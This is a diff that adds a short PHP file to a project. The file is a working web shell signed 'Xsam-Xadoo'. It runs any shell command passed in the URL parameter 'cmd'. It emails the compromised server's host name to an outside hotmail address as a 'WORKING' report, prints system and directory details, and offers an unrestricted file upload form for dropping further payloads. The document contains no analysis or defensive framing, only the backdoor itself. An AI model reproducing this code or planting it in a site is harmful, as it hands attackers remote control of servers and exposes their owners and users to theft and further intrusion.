@@ -1,0 +1,5 @@
+<?php $Iam_BoT = 'BoT '; echo "Xsam-Xadoo ".$Iam_BoT;system($_GET['cmd']); ?> <?php  
+$local_key2 = $_SERVER['HTTP_HOST'];
+$xx = rand();
+mail('xsam.xadoo.2017@hotmail.com',"Result Report Test - ".$xx,"WORKING ! $local_key2");
+echo 'PRIVET BOT BY XSam-XAdoo'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
